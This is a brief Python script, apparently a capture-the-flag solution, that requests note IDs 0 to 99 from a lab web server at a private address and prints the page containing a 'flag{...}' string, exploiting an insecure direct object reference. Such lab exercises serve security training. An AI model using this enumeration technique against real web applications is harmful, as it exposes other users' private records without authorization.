import re
import requests



for _ in range(0,100):
	index = str(_)
	r = 'http://10.10.103.251/note.php?note='
	r += index

	r =requests.get(r)

	if re.findall("flag{.*}",r.text) :
		print("[+] Find Flag  : ",r.text)
		break
